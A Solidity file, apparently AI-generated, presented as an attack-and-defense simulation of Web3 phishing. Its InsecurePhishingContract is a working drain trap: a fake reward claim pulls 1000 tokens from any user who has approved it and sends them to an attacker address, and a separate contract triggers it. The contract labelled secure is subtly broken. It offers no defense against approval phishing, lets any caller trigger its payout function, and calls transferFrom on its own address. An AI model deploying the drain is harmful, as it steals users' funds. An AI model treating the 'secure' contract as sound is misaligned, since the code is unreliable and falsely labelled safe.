// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title SocialEngineeringPhishingAttackDefense - Full Attack and Defense Simulation for Social Engineering and Phishing in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Phishing Contract (Fake Approve Trap)
contract InsecurePhishingContract {
    address public attacker;

    event ApprovalPhished(address indexed victim, uint256 amount);

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function fakeClaimReward(address tokenAddress) external {
        // User is tricked into approving attacker contract
        IERC20(tokenAddress).transferFrom(msg.sender, attacker, 1000 ether);
        emit ApprovalPhished(msg.sender, 1000 ether);
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

/// @notice Secure Token Interaction Contract (Strict Approval Binding + Safe Interactions)
contract SecureTokenInteraction {
    address public immutable owner;
    IERC20 public immutable token;
    mapping(address => bool) public approvedUsers;
    uint256 public constant APPROVE_LIMIT = 10 ether;

    event ApprovalRegistered(address indexed user, uint256 limit);
    event SafeTransferExecuted(address indexed user, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address _token) {
        owner = msg.sender;
        token = IERC20(_token);
    }

    function registerApproval() external {
        require(token.transferFrom(msg.sender, address(this), APPROVE_LIMIT), "Transfer failed");
        approvedUsers[msg.sender] = true;
        emit ApprovalRegistered(msg.sender, APPROVE_LIMIT);
    }

    function safeTransferBack(address to, uint256 amount) external {
        require(approvedUsers[to], "Not approved");
        require(amount <= APPROVE_LIMIT, "Over limit");
        require(token.transferFrom(address(this), to, amount), "Send back failed");

        emit SafeTransferExecuted(to, amount);
    }
}

/// @notice Attack contract simulating phishing claim page
contract PhishingIntruder {
    address public targetInsecure;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function launchFakeClaim(address tokenAddress) external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("fakeClaimReward(address)", tokenAddress)
        );
    }
}
